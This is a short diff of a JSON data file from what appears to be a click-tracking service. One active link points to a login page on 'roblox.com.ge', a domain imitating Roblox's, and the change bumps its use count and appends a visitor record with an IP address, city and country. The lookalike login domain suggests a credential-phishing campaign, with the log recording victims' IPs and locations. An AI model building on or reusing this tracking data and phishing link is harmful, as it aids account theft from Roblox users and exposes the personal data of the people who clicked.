@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1123,
+    "useCount": 1124,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9128,6 +9128,14 @@
         "city": "Davao City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777273002534,
+        "ip": "189.216.19.169",
+        "country": "Mexico",
+        "city": "Mexicali",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
